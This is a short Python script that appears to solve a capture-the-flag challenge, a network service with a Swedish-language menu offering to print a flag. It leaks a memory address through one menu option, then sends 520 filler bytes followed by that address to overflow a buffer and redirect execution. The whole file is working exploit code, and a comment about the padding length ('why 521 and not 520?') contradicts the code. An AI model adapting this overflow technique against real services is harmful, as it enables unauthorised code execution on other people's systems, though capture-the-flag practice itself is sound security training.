import socket
import struct
import sys
import time
def sendrecieve(socket, buffer):
    socket.send(buffer)
    time.sleep(0.1)
    result = socket.recv(1024)
    print(result)
    return result


if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <IP> <PORT>")
    sys.exit(1)
HOST = sys.argv[1]
PORT   = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
time.sleep(0.1)
res = s.recv(1024)
print(res)

buffer = b"\x32\x00"
address = sendrecieve(s, buffer)
address = str(address)
address = address.replace("\\nDina val\\n\\n1. Printa ett sk\\xc3\\xa4mt eller citat\\n2. Printa flaggan\\n3. ???\\n4. Exit\\n", "")
address = address.replace("b'", "")
address = address.replace("'", "")

compatibleaddress = struct.pack("<Q", int(address, 16))
print(compatibleaddress)
compatibleaddress = compatibleaddress[0:6]
print(compatibleaddress)

buffer = b"\x33\x00"
sendrecieve(s, buffer)

buffer = b"\x41" * 520 # what? why 521 and not 520? don't know, but it doesn't work without it.
buffer += compatibleaddress

sendrecieve(s, buffer)
res = s.recv(1024)
print(res)
